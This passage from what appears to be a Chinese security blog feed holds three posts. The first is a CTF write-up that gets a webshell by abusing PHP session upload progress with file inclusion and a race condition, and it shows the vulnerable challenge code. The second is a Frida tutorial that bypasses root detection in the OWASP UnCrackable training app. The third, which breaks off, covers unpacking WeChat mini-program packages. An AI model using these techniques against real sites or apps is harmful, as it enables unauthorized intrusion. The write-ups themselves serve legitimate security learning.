        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-环境配置-amp-利用条件"><a href="#0x01-环境配置-amp-利用条件" class="headerlink" title="0x01 环境配置&amp;利用条件"></a>0x01 环境配置&amp;利用条件</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a3a989a100484cd9c2fd8c5eda92c35c.png" alt="image-20210922091243957"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9217f6ff808afc66e8a94362faba1eff.png" alt="image-20210924100930479"></p><p>环境分析</p><ul><li><p>session.use_strict_mode默认值为0，此时用户是可以<strong>自己定义Session ID</strong>的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们在Cookie里设置PHPSESSID&#x3D;flag，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag</span><br></pre></td></tr></table></figure></li><li><p>session.upload_progress.prefix由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p></li></ul><p><strong>所以：</strong></p><ul><li>这个文件名是PHPSESSID=flag，文件名可控</li><li>内容也是可以通过PHP_SESSION_UPLOAD_PROGRESS写入的</li><li><strong>如果有文件包含</strong>，就可以 getshell</li></ul><p>一般情况还需要<strong>条件竞争</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在默认情况下，session.upload_progress.cleanup是开启的</span><br><span class="line">所以要是处理了所有POST数据，它就会清除进度信息，这个文件就没了</span><br><span class="line"></span><br><span class="line">所以需要使用条件竞争：</span><br><span class="line">要在没有处理完post数据的时候就要去触发</span><br></pre></td></tr></table></figure><h1 id="0x02-题目"><a href="#0x02-题目" class="headerlink" title="0x02 题目"></a>0x02 题目</h1><p>这个题是第五空间CTF的一道WEB题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'mode'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'mode'</span>] == <span class="string">"eval"</span>)&#123;</span><br><span class="line">    $shell = $_GET[<span class="string">'shell'</span>] ?? <span class="string">'phpinfo();'</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen($shell) &gt; <span class="number">15</span> | filter($shell) | checkNums($shell)) <span class="keyword">exit</span>(<span class="string">"hacker"</span>);</span><br><span class="line">    <span class="keyword">eval</span>($shell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">'file'</span>]) &gt; <span class="number">15</span> | filter($_GET[<span class="string">'file'</span>])) <span class="keyword">exit</span>(<span class="string">"hacker"</span>);</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($var)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">    $banned = [<span class="string">"while"</span>, <span class="string">"for"</span>, <span class="string">"\$_"</span>, <span class="string">"include"</span>, <span class="string">"env"</span>, <span class="string">"require"</span>, <span class="string">"?"</span>, <span class="string">":"</span>, <span class="string">"^"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>, <span class="string">"%"</span>, <span class="string">"*"</span>, <span class="string">"`"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($banned <span class="keyword">as</span> $ban)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $ban)) <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span><span class="params">($var)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">    $alphanum = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">    $cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($alphanum); $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($var); $j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>($var[$j] == $alphanum[$i])&#123;</span><br><span class="line">                $cnt += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>($cnt &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h1><h3 id="上传HTML："><a href="#上传HTML：" class="headerlink" title="上传HTML："></a>上传HTML：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name 要对应session.upload_progress.name中的 PHP_SESSION_UPLOAD_PROGRESS</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/fb3ae7da32899747002fa5f73fa8633c.png" alt="image-20210924103445313"></p><p>HTML代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;xxxxxxxx.com:8088&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;zzzz&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="然后抓包，在里面插入我们的一句话木马"><a href="#然后抓包，在里面插入我们的一句话木马" class="headerlink" title="然后抓包，在里面插入我们的一句话木马"></a>然后抓包，在里面插入我们的一句话木马</h3><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dwKWo8Vo-1632451391682)(…/Library/Application Support/typora-user-images/image-20210924104028736.png)]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所以文件地址就是 &#x2F;tmp&#x2F;sess_zz5</span><br><span class="line">最终利用文件包含获取webshell</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/aff952442b184943d224ac4a05a61569.png" alt="image-20210924103851551"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/112d8f5c53b0311f13a0feec9d769801.png" alt="image-20210924103915529"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android逆向之frida安装与简单使用Crackmes/Android/Level_01</title>
      <link href="/2021/09/14/android%E9%80%86%E5%90%91%E4%B9%8Bfrida%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8Crackmes!Android!Level_01/"/>
      <url>/2021/09/14/android%E9%80%86%E5%90%91%E4%B9%8Bfrida%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8Crackmes!Android!Level_01/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-在电脑上安装adb"><a href="#0x01-在电脑上安装adb" class="headerlink" title="0x01 在电脑上安装adb"></a>0x01 在电脑上安装adb</h1><h2 id="安装adb"><a href="#安装adb" class="headerlink" title="安装adb"></a>安装adb</h2><p>我们要在电脑上通过adb与手机进行交互，所以要先安装adb</p><h2 id="1-安装-adb"><a href="#1-安装-adb" class="headerlink" title="1.安装 adb"></a>1.安装 adb</h2><p>windows电脑安装adb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以通过安装android sdk</span><br><span class="line">然后就是 &#x2F;android sdk&#x2F;platform-tools&#x2F;adb.exe</span><br></pre></td></tr></table></figure><p>Mac安装命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install android-platform-tools</span><br></pre></td></tr></table></figure><h2 id="2-将手机通过数据线连接到电脑上"><a href="#2-将手机通过数据线连接到电脑上" class="headerlink" title="2.将手机通过数据线连接到电脑上"></a>2.将手机通过数据线连接到电脑上</h2><ul><li>要设置手机打开usb调试</li><li>一般就在 手机设置-关于-开发者选项-允许usb调试 （不同手机不一样，自己找找USB调试）</li></ul><h2 id="3-运行adb-在终端输入如下命令-查看连接的设备"><a href="#3-运行adb-在终端输入如下命令-查看连接的设备" class="headerlink" title="3.运行adb,在终端输入如下命令,查看连接的设备"></a>3.运行adb,在终端输入如下命令,查看连接的设备</h2><p>运行adb命令，查看当前连接设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/75249aca8a1e99fd5fb78ca8d825449b.png" alt="image-20210825203950358"></p><p>显示有device就是连接上了设备</p><h1 id="0x02-在电脑上-安装python3"><a href="#0x02-在电脑上-安装python3" class="headerlink" title="0x02 在电脑上-安装python3"></a>0x02 在电脑上-安装python3</h1><p>windows电脑去官网下载，自己百度安装吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：高版本的frida 要配合高版本的python</span><br><span class="line">我的是 pyhton 3.7.9 和 frida 15.0.15</span><br></pre></td></tr></table></figure><p>Mac版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install python@3.7</span><br></pre></td></tr></table></figure><h1 id="0x03-在电脑上安装frida-tools"><a href="#0x03-在电脑上安装frida-tools" class="headerlink" title="0x03 在电脑上安装frida-tools"></a>0x03 在电脑上安装frida-tools</h1><p>这个其实是python的一个模块，自动化编写hook脚本一定要引入的。</p><p>windows与Mac 的命令一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install frida-tools</span><br></pre></td></tr></table></figure><h1 id="0x04-在手机上安装frida-server"><a href="#0x04-在手机上安装frida-server" class="headerlink" title="0x04 在手机上安装frida-server"></a>0x04 在手机上安装frida-server</h1><ul><li><p>电脑上配置完后，手机端也需要配置</p><ul><li>现在需要下载frida-server端到手机中</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载地址：</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure><p>版本很多</p><p><img src="https://img-blog.csdnimg.cn/img_convert/46518c7d41f003e20793ce89eb1fda89.png" alt="image-20210825213116374"></p><p>androids就是下面几个，对应去下载就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-server-15.0.18-android-arm.xz             ----真机32位 </span><br><span class="line">frida-server-15.0.18-android-arm64.xz           ----真机64位 </span><br><span class="line">frida-server-15.0.18-android-x86.xz             ----android模拟器32位 </span><br><span class="line">frida-server-15.0.18-android-x86_64.xz          ----android模拟器64位</span><br></pre></td></tr></table></figure><ul><li><p>下载完android设备相对应的frida-server后</p></li><li><p>通过adb push将frida-server发送到android设备中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;frida-server&#x2F;frida-server-12.10.4-android-arm  &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line"></span><br><span class="line">adb push （本机frida-server地址）（手机要放的地址）</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/7b18a9d117431a34c6cdc2f2ff7d0511.png" alt="image-20210825213522189"></p><ul><li><p>手机上启动frida-server</p></li><li><p>这样电脑上的frida客户端才能与手机中的frida服务端才可以进行交互</p></li><li><p>上述已经将frida-server放入 /data/local/tmp中</p><p>启动adb shell 进入手机的shell中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看adb连接的设备</span><br><span class="line">adb devices</span><br><span class="line">#启动adb shell 进入手机的shell中</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/178f9011c666b5c4570f220639d3394e.png" alt="image-20210825213820963"></p></li><li><p>找到frida-server，给他执行权限，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进入手机shell</span><br><span class="line">adb shell</span><br><span class="line"># 找到对应目录</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</span><br><span class="line"># 给运行权限</span><br><span class="line">chmod 775 frida-server-15-arm64</span><br><span class="line"># 后台持久运行，如果运行一次就直接 .&#x2F;frida-server-15-arm64</span><br><span class="line">.&#x2F;frida-server-15-arm64 &amp;</span><br></pre></td></tr></table></figure><p>下面是我的命令</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b3415baa471b52f5d2ba74fffb7d8a6.png" alt="image-20210825214647006"></p></li></ul><h1 id="0x05-frida的使用"><a href="#0x05-frida的使用" class="headerlink" title="0x05 frida的使用"></a>0x05 frida的使用</h1><p>安装完之后，就是怎么使用frida了</p><p><strong>注意：</strong></p><p>刚刚在手机端安装好frida-server的时候，发现frida命令有的可用有的不可用，比如frida-ps -U 可执行，而frida-ps -R 就会执行报错（Failed to enumerate processes: unable to connect to remote frida-server），原因发现需要在客户端开启端口转发才可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>命令做了端口开启，才使得问题解决</p><p>frida tools主要有这几个常用的功能</p><ul><li><strong>frida-ls-devices</strong> 查看设备信息，主要包括<strong>UDID</strong>、<strong>连接方式</strong>、<strong>iOS设备名称</strong>，如下所示</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/d25682948f46b37d41c6089668836cf2.png" alt="image-20210825215527181"></p><ul><li><strong>frida-ps</strong> 查看通过USB连接的iOS设备上运行的程序</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通常使用frida-ps -Ua  查看正在运行的应用</span><br><span class="line">通常使用frida-ps -Uai 查看已经安装的应用程序</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f43c77edaa4dc3dd99bd8a60011e4aea.png" alt="image-20210825215811929"></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GDTyv1if-1631581506681)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20210825220111.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20210825220111.png\)\]</a></p><ul><li><strong>frida-trace</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -D &lt;UDID&gt; 通过UDID查看设备中应用程序中的pid、进程名</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c1769b264e441c33659c361f1dd0f24c.png" alt="image-20210825220327085"></p><ul><li>**frida-kill ** 结束某个机子的进程</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-kill -D &lt;UDID&gt; &lt;pid&gt;</span><br></pre></td></tr></table></figure><h1 id="0x06-通过python及JavaScript脚本自动化来hook"><a href="#0x06-通过python及JavaScript脚本自动化来hook" class="headerlink" title="0x06 通过python及JavaScript脚本自动化来hook"></a>0x06 通过python及JavaScript脚本自动化来hook</h1><ul><li>下面就是，frida还可以通过python及JavaScript脚本来hook android设备中的应用程序</li><li>这个python调用和注入脚本，基本上都是固定的，只需要修改准备hook的app的bundleId和javaScript脚本地址就好了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: Zeo</span></span><br><span class="line"><span class="comment"># python: 3.7 </span></span><br><span class="line"><span class="comment"># datetime:2021/8/23 6:30 下午</span></span><br><span class="line"><span class="comment"># software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">文件说明：通过python及JavaScript脚本自动化来hook </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入frida模块</span></span><br><span class="line"><span class="keyword">import</span> frida, sys </span><br><span class="line"><span class="comment">#准备执行的frida javaScript脚本</span></span><br><span class="line">script = <span class="string">'Frida-Mobile-Scripts/Android/system_exit_bypass.js'</span> </span><br><span class="line"><span class="comment">#准备hook的app的bundleId</span></span><br><span class="line">bundle = <span class="string">'owasp.mstg.uncrackable1'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打开frida脚本，读取frida脚本</span></span><br><span class="line">f = open(script, <span class="string">"r"</span>) </span><br><span class="line">s = f.read() </span><br><span class="line"></span><br><span class="line"><span class="comment">#连接usb设备 1000表示超时</span></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>) </span><br><span class="line"><span class="comment">#启动指定bundleId的app</span></span><br><span class="line">pid = device.spawn([bundle])</span><br><span class="line"><span class="comment">#附加到app</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">#创建frida javaScript脚本</span></span><br><span class="line">script = session.create_script(s)</span><br><span class="line"><span class="comment">#load脚本到app进程中 这样即注入成功</span></span><br><span class="line">script.load() </span><br><span class="line"><span class="comment">#恢复app运行</span></span><br><span class="line">device.resume(pid) </span><br><span class="line"><span class="comment">#读取打印日志</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h1 id="0x07-安装测试应用，简单使用"><a href="#0x07-安装测试应用，简单使用" class="headerlink" title="0x07 安装测试应用，简单使用"></a>0x07 安装测试应用，简单使用</h1><p>下载完以后通过adb 将apk安装到手机中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install UnCrackable-Level1.apk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/62dad13b8a9bd2fb9aea19e1b118b0ea.png" alt="image-20210825201232862"></p><p>下载地址：</p><p><em><strong><a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android/Level\_01" target="_blank" rel="noopener">https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android/Level\_01</a></strong></em></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a5bb4b8fcb56afef20047975aea4eeaa.png" alt="WechatIMG119"></p><h2 id="一个root检测的绕过"><a href="#一个root检测的绕过" class="headerlink" title="一个root检测的绕过"></a>一个root检测的绕过</h2><h2 id="1、反编译静态分析app"><a href="#1、反编译静态分析app" class="headerlink" title="1、反编译静态分析app"></a>1、反编译静态分析app</h2><p>我们常用的工具有jeb、jadx等工具进行分析</p><p>这里我推荐使用jadx反编译分析。</p><p>打开软件，直接打开要反编译的APK就可以了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/755621ad18ac23cbb92fcc204e48ed8d.png" alt="image-20210831101758315"></p><h2 id="2、分析app的检测android设备是否root的功能"><a href="#2、分析app的检测android设备是否root的功能" class="headerlink" title="2、分析app的检测android设备是否root的功能"></a>2、分析app的检测android设备是否root的功能</h2><p>根据提示的字符串找到这个检测函数</p><p><img src="https://img-blog.csdnimg.cn/img_convert/541ad0c815d2e27094a063c2a1fd8819.png" alt="image-20210831101926899"></p><p>root检测主要靠三个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.a() c.b() c.c()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0e939665965a8d08f2557d7f062e8ddc.png" alt="image-20210831102019408"></p><p>基本上就是通过 环境变量 PATH检测、test-key文件、或者一下目录或者文件检测是否root</p><p><img src="https://img-blog.csdnimg.cn/img_convert/47302d28a5e7a3254b1476e7e20fa8ca.png" alt=""></p><p>但其实不用这么麻烦，可以直接hook System.exit函数，app虽然检测到我们的设备已经root，但是不让它退出，继续运行也是一样的效果</p><h2 id="3、编写hook-js脚本"><a href="#3、编写hook-js脚本" class="headerlink" title="3、编写hook js脚本"></a>3、编写hook js脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    const System &#x3D; Java.use(&#39;java.lang.System&#39;)</span><br><span class="line"></span><br><span class="line">    console.log(&quot;--&gt; System.exit() Bypass - Script Loaded&quot;)</span><br><span class="line">    System.exit.implementation &#x3D; function()&#123;</span><br><span class="line">        console.log(&quot;System.exit() Bypassed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>点击之后就成功绕过退出了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6413bb4baa1fc91a4b5c0ca3a716163e.png" alt="WechatIMG120"></p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android python Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透测试-前端打包调试解密</title>
      <link href="/2021/08/31/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%89%8D%E7%AB%AF%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95%E8%A7%A3%E5%AF%86/"/>
      <url>/2021/08/31/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%89%8D%E7%AB%AF%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-用到的环境"><a href="#0x01-用到的环境" class="headerlink" title="0x01 用到的环境"></a>0x01 用到的环境</h1><ul><li>node环境</li><li>wxappUnpacker</li><li>微信开发者工具</li><li>网易mumu模拟器（Android6版本）</li><li>mt管理器（模拟器中的文件管理工具）</li></ul><h1 id="0x02-编译阶段"><a href="#0x02-编译阶段" class="headerlink" title="0x02 编译阶段"></a>0x02 编译阶段</h1><ul><li>首先找到小程序的安装包，可以找个手机，点开小程序后，找到手机文件目录, 一般是这样的目录。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicromMsg&#x2F;c6dxxxxxxxxxxxxx&#x2F;appbrand&#x2F;pkg&#x2F;*.wxapkg</span><br></pre></td></tr></table></figure><p>注：此时必须root</p><p>mt管理器</p><p><img src="https://img-blog.csdnimg.cn/img_convert/05d9b7e1f7dd32916ac7a37eed306957.png" alt="image-20210818135324406"></p><p>然后自己想办法现在把这些包从手机里导出来（如果很多wxapkg建议清理一下，重启目标小程序。)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/65a3af0f69b43544abf9b225c1289cbd.png" alt="image-20210820140233664"></p><h1 id="0x03-反编译wxapkg获取源文件"><a href="#0x03-反编译wxapkg获取源文件" class="headerlink" title="0x03 反编译wxapkg获取源文件"></a>0x03 反编译wxapkg获取源文件</h1><p>Github上已经有大神写的node.js版本的，当然也有其它版本的，例如python版本，不用管什么版本的，能用就行了。</p><blockquote><p>GitHub地址：</p><p><a href="https://github.com/qwerty472123/wxappUnpacker" target="_blank" rel="noopener">https://github.com/qwerty472123/wxappUnpacker</a></p></blockquote><p>进入到下载好的反编译脚本目录下，在node命令窗口中依次安装需要的依赖。</p><p>项目中列出来的需要安装的依赖不全，如果报错，看下issues就行了，下面是在我能运行状态下安装的依赖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解包主包  </span><br><span class="line">   - windows系统使用: &#96;.&#x2F;bingo.bat testpkg&#x2F;master-xxx.wxapkg&#96;</span><br><span class="line">   - Linux系统使用: &#96;.&#x2F;bingo.sh testpkg&#x2F;master-xxx.wxapkg&#96;</span><br><span class="line">2. 解包子包  </span><br><span class="line">   - windows系统使用: &#96;.&#x2F;bingo.bat testpkg&#x2F;sub-1-xxx.wxapkg -s&#x3D;..&#x2F;master-xxx&#96;</span><br><span class="line">   - Linux系统使用:  &#96;.&#x2F;bingo.sh testpkg&#x2F;sub-1-xxx.wxapkg -s&#x3D;..&#x2F;master-xxx&#96;</span><br></pre></td></tr></table></figure><p>实际运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bingo.sh &#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;pentest_tools&#x2F;xcx&#x2F;rongegou&#x2F;_1549897879_353.wxapkg</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f8bfbc80f1e912fc32a41b32ac081efe.png" alt="image-20210820150521776"></p><p>用VScode打开查看源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d9355188b4e212a66b56526a3e9a2439.png" alt="image-20210820150817422"></p><h1 id="0x04-微信开发者工具调试"><a href="#0x04-微信开发者工具调试" class="headerlink" title="0x04 微信开发者工具调试"></a>0x04 微信开发者工具调试</h1><p>下载微信开发者工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;developers.weixin.qq.com&#x2F;miniprogram&#x2F;dev&#x2F;devtools&#x2F;download.html</span><br></pre></td></tr></table></figure><p><img 